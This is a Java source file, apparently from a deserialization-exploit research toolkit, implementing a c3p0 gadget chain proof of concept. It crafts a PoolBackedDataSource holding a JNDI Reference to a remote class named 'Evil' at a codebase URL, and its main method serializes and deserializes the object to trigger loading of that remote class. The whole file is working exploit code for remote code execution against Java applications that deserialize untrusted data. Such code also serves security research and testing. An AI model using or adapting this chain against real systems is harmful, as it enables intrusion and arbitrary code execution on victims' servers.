package xyz.eki.marshalexp.poc;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;


/**
 *  * com.sun.jndi.rmi.registry.RegistryContext->lookup
 *  * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
 *  * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
 */
public class C3P0 implements POC{
    public Object getPocObject(String url,String ClassName) throws Exception {
        PoolBackedDataSource b = ReflectUtils.createWithoutConstructor(PoolBackedDataSource.class);
        ReflectUtils.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(ClassName, url));
        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

    }

    public static void main(String[] args) throws Exception{
        String url="http://127.0.0.1:8088";
        String className = "Evil";
        Object poc = new C3P0().getPocObject(url,className);
        SerializeUtils.deserialize(SerializeUtils.serialize(poc));
    }

}
